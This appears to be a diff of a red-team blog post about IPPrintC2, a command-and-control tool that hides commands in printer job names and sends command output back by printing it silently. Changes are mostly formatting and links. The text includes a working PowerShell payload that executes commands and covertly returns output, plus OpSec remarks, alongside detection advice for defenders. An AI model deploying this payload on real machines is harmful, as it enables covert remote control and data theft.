@@ -66,19 +66,20 @@ ForEach ($SplittedCommand in $CommandDoc)
     }
 ```
 
-On the client side, concatenation is easy with .join(). 
+On the client side, concatenation is easy with `-join ""` 
 ```powershell
 ((get-printjob XPS).documentname -join "")
 ```
 
-As for the output of executed commands, this was a completely different beast. I first tried using `Out-Printer`, but then a pop-up would appear on the victim's machine that the document is being printed. After several days and with the help of a colleague, we found a very simple and elegant solution:
+As for the output of executed commands, this was a completely different beast. I first tried using [Out-Printer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-printer?view=powershell-7.6), but then a pop-up would appear on the victim's machine that the document is being printed. After several days and with the help of a colleague, we found a very simple and elegant solution:
 ```powershell
     $Bytes = [System.Text.Encoding]::Unicode.GetBytes("[scriptblock]`$x={<command you wish to execute>};`$j=(`$x|iex);Add-Type -AssemblyName System.Drawing;`$pd=New-Object System.Drawing.Printing.PrintDocument;`$pd.PrinterSettings.PrinterName=`"<name of the printer>`";`$pd.PrintController=new-object System.Drawing.Printing.StandardPrintController;`$f=[System.Drawing.Font]::new('Arial',10,[System.Drawing.FontStyle]::Bold);`$c=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(255,0,0,0));`$lpp=50;`$fs=15;`$ml=`$j.Length;`$cnt=0;function GetNewLine(){`$cl=`$cnt;`$np=`$false;`$r=`$null;if(`$j -isnot [array]){if(`$cl -eq 0){`$r=`$j}}else{if(`$cnt -lt `$ml){`$r=`$j[`$cnt];if((`$cnt+1)%`$lpp -eq 0){`$np=`$true}}}`$global:cnt=`$global:cnt+1;return `$r,`$cl,`$np}`$p={`$y=10;`$_.HasMorePages=`$true;while(`$true){`$r,`$cl,`$np=GetNewLine;if(`$r -eq `$null){`$_.HasMorePages=`$false;break};`$_.Graphics.DrawString(`$r,`$f,`$c,10,`$y);`$y=`$y+`$fs;if(`$np){break;}}};`$pd.add_PrintPage(`$p);`$pd.Print()")
-
 ```
 Mkay? All understood? Please, do not make me go through this again. It just works, trust me. No pop-ups. OpSec accomplished. Pre-AI. 
 
-And lastly, I just used `Remove-PrintJob` to clear the document queue, after the commands were executed on the victim. I encourage you to read the almighty script [here](https://github.com/Diverto/IPPrintC2/blob/main/Server/IPPrintC2.ps1). It is both simple, complex and to me - fascinating how it works. Summary of features:
+And lastly, I just used [Remove-PrintJob](https://learn.microsoft.com/en-us/powershell/module/printmanagement/remove-printjob?view=windowsserver2025-ps) to clear the document queue, after the commands were executed on the victim. 
+
+I encourage you to read the almighty script [here](https://github.com/Diverto/IPPrintC2/blob/main/Server/IPPrintC2.ps1). It is both simple, complex and to me - fascinating how it works. Summary of features:
 
 **Command execution** — sends base64-encoded commands to connected clients by setting them as document names and invoking the `Print()` method. Commands longer than 252 characters are automatically split across multiple print jobs and concatenated on the client side. Supports two modes: blind execution (no output) and output retrieval, where command results are rendered as a PDF using `System.Drawing` and printed back to the C2 server.
 
@@ -197,7 +198,9 @@ DESKTOP-PRINTINGFUN
 ```
 ![Command execution on the client](/assets/img/2/ipprintc2-command-exec-via-document-name.png)
 
-Nothing is perfect, and this C2 is a text-book example. After this C2 was published it was never used again, nor maintained. It served its purpose. Also, it works as one-to-all — every client connected to the same printer receives the same commands. If you are insane enough to use this in a real engagement and need per-target control, set up additional printers and run multiple instances of IPPrintC2.ps1. Want binary exfiltration? How about no. Only works with ASCII text-based files. IIS is exposed with anonymous authentication. With document names as commands in Base64. You really need to use the whitelist approach for network segments you are targeting. Use SSL to encrypt the IPP traffic unless you want to share your tasking with everyone on the wire. I also had a better name for this C2 - PrintC2, but WithSecure had published a blogpost where they used printers for lateral movement, and used that name.
+Nothing is perfect, and this C2 is a text-book example. After this C2 was published it was never used again, nor maintained. It served its purpose. Also, it works as one-to-all — every client connected to the same printer receives the same commands. If you are insane enough to use this in a real engagement and need per-target control, set up additional printers and run multiple instances of IPPrintC2.ps1. Want binary exfiltration? How about no. Only works with ASCII text-based files. 
+
+IIS is exposed with anonymous authentication. With document names as commands in Base64. You really need to use the whitelist approach for network segments you are targeting. Use SSL to encrypt the IPP traffic unless you want to share your tasking with everyone on the wire. I also had a better name for this C2 - PrintC2, but WithSecure had published a blogpost where they used printers for lateral movement, and used that name.
 
 As for the detection, printer installation is not logged in Event Viewer. However, it can be enabled under `Event Viewer -> Application and Services Logs -> Microsoft -> Windows -> PrintService`. Right-click and enable the Operational log or use [Group Policy](https://social.technet.microsoft.com/Forums/windowsserver/en-US/8e7399f6-ffdc-48d6-927b-f0beebd4c7f0/enabling-quotprint-historyquot-through-group-policy?forum=winserverprint).
 
@@ -207,7 +210,7 @@ Once enabled, monitor for:
 
 I imagine enabling this will produce useless logs that fill the storage and no one looks at, just to catch some guy's C2 that no one uses. But you've been warned. Beyond that: centralized SIEM logging, PowerShell Transcription, and command-line logging will catch the payload execution itself. The `Get-PrintJob` called in a loop is not something you should see in normal user behavior.
 
-My colleague [kost](https://github.com/kost) who I admire and who greatly improved the initial version of document extraction / command output with the iTextSharp implementation - actually found this C2 impressive. I was shocked, as he is hard to please. Maybe it was the idea, not the implementation of it that set him into a spiral of happiness? Not only that, but he convinced me (after a few beers) to submit it as a talk to Black Hat's CFP. And they actually responded - "it has potential". Should I think of it as a Matrix "has potential" or as an IQ test "has potential"? Never mind.
+My colleague [kost](https://github.com/kost) who I admire and who greatly improved the initial version of document extraction / command output with the iTextSharp implementation - actually found this C2 impressive. I was shocked, as he is hard to please. Maybe it was the idea, not the implementation of it, that set him into a spiral of happiness? Not only that, but he convinced me (after a few beers) to submit it as a talk to Black Hat's CFP. And they actually responded - "it has potential". Should I think of it as a Matrix "has potential" or as an IQ test "has potential"? Never mind.
 
 There are [many](https://howto.thec2matrix.com) better, used and maintained C2 frameworks, but this one is mine.
 
